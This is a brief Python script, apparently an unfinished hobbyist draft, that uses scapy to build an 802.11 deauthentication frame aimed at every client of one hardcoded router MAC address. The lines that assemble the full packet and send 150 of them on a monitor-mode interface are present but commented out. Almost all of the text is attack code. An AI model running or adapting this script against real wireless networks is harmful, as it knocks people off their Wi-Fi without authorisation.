import  scapy.all as scapy 

from scapy.all import *

deauthno = input("Enter the number of packets to deauth client ")
print(type(deauthno))
routermac = "40:31:3C:E7:4D:28"
clientmac = "ff:ff:ff:ff:ff:ff"

dot11info = Dot11(addr1=clientmac,addr2=routermac,addr3=routermac)
#combine
#packet = RadioTap()/dot11info/Dot11Deauth(reason=7)


#150
# sendp(packet,inter=0.1,count=150,iface="wlan0mon",verbose=1)




